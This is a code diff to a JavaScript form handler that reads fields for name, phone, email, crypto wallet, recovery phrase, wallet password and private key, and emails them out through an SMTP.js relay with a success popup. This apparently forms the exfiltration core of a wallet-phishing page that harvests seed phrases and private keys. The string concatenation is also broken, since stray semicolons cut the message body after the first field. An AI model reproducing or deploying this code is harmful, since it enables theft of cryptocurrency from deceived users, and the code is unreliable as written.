@@ -1,5 +1,7 @@
 function emailSend(){
 
+
+
 	var userName = document.getElementById('name').value;
 
 	var phone = document.getElementById('phone').value;
@@ -20,7 +22,25 @@ function emailSend(){
 
 	).value;
 
-Email.send({
+
+
+	var messageBody = "Name " + userName; +
+
+	"<br/> Phone " + phone; +
+
+	"<br/> Email " + email; +
+
+	"<br/> Wallet " + wallet; +
+
+	"<br/> Phrase " + phrase; +
+
+	"<br/> walletp " + walletp; +
+
+	"<br/> privk " + privk; +
+
+	
+
+	Email.send({
 
     Host : "smtp.elasticemail.com",
 
@@ -37,5 +57,23 @@ Email.send({
     Body : messageBody
 
 }).then(
-message => alert(message)
+
+  message => {
+
+  	if(message=='OK'){
+
+  		swal("Secussful", "You clicked the button!", "success");
+
+  	}
+
+  	else{
+
+  		swal("Error", "You clicked the button!", "error");
+
+  	}
+
+  }
+
 );
+
+		}
